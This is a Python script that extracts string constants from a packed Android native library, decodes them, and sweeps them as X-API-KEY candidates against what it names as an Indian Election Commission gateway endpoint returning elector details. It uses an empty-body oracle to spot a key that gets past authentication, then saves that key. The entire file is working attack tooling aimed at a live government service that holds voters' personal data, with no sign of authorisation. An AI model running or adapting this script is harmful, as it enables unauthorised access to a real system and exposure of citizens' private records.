#!/usr/bin/env python3
"""
apikey_oracle.py - find the app's X-API-KEY by sweeping the native string table.

`eepic/GetElectorDetailForEEPIC` and `eepic/GetEEPICCard` are gated only by an
`X-API-KEY` header, and that key - like `tc` and `external` - lives as a
plaintext Base64/hex constant inside libnative_lib.so (the .text is packed, so
the code that picks it is unreadable, but the constants are all there).

Strategy: send a deliberately empty body with each candidate key. A wrong key
gives 401; a *right* key gets past auth and the gateway complains about the
body instead (400/500), which is detectable without knowing the schema.

    python work/apikey_oracle.py                       # sweep, empty body
    python work/apikey_oracle.py --body '{"epic_no":"TBG0342345"}'
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import key_oracle  # noqa: E402

BASE = Path(__file__).resolve().parent
API = "https://gateway-vha.eci.gov.in/api/v1/"
TARGET = "eepic/GetElectorDetailForEEPIC"
SO = BASE / "out/native/libnative_lib.so"

HEADER_NAME = "X-API-KEY"
NOISE = re.compile(
    r"^(?:[a-z_]{4,}|lib.*|.*\.so.*|Java_|https?://|application/|__.*|[A-Z_]{3,})$"
)


def _b64d(text: str) -> str | None:
    import base64
    try:
        raw = base64.b64decode(text + "=" * (-len(text) % 4))
        val = raw.decode("ascii")
    except Exception:  # noqa: BLE001
        return None
    return val if val.isprintable() and "\x00" not in val else None


def candidates(texts: list[str], min_len: int, max_len: int) -> list[str]:
    """Every form a constant can take on the wire.

    BaseActivity returns `new String(Base64.decode(nativeConstant))`, so the
    value actually sent is the *decoded* string, not the literal in .rodata:
    try the literal, one decode, and two decodes.
    """
    out, seen = [], set()

    def add(value: str) -> None:
        if not (min_len <= len(value) <= max_len):
            return
        if not value.isascii() or value in seen:
            return
        if re.fullmatch(r"[A-Za-z0-9+/=_.\-:#$!@*()' ]+", value) is None:
            return
        if NOISE.match(value):
            return
        seen.add(value)
        out.append(value)

    for t in texts:
        if t.startswith("Java_") or "Java_com" in t or ".so" in t:
            continue
        add(t)
        once = _b64d(t)
        if once:
            add(once)
            twice = _b64d(once)
            if twice:
                add(twice)
    return out


def probe(key: str, body: dict) -> tuple[int, str]:
    req = urllib.request.Request(API + TARGET, method="POST",
                                 data=json.dumps(body).encode())
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    req.add_header("User-Agent", "okhttp/4.12.0")
    req.add_header(HEADER_NAME, key)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")[:200]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:  # noqa: BLE001
        return 0, f"{type(e).__name__}: {e}"


def main() -> int:
    ap = argparse.ArgumentParser(description="Sweep X-API-KEY candidates")
    ap.add_argument("--so", type=Path, default=SO)
    ap.add_argument("--body", default="{}")
    ap.add_argument("--min-len", type=int, default=16)
    ap.add_argument("--max-len", type=int, default=200)
    ap.add_argument("--delay", type=float, default=1.6)
    ap.add_argument("--limit", type=int, default=60)
    ap.add_argument("--list", action="store_true", help="print candidates only")
    args = ap.parse_args()

    texts = key_oracle.strings_in(args.so.read_bytes()) if args.so.is_file() else []
    cands = candidates(texts, args.min_len, args.max_len)
    body = json.loads(args.body)
    print(f"[apikey] {len(texts)} strings -> {len(cands)} key candidates; "
          f"target {TARGET}, body {args.body}\n")

    if args.list:
        for i, key in enumerate(cands[:args.limit]):
            print(f"{i:03d} {key[:90]}")
        return 0

    for i, key in enumerate(cands[:args.limit]):
        status, raw = probe(key, body)
        flag = ""
        if status not in (401, 403):
            flag = "   <-- INTERESTING (auth passed?)"
        shown = key if len(key) <= 44 else key[:41] + "..."
        print(f"{i:03d} {shown:46s} -> {status} {raw[:70]}{flag}")
        if status not in (401, 403, 0):
            (BASE / "out" / "apikey_candidate.json").write_text(
                json.dumps({"key": key, "status": status, "response": raw}, indent=2),
                encoding="utf-8")
            print(f"\n[apikey] candidate recorded -> {(BASE / 'out/apikey_candidate.json')}")
            return 0
        time.sleep(args.delay)
    print("\n[apikey] no candidate got past auth")
    return 1


if __name__ == "__main__":
    sys.exit(main())
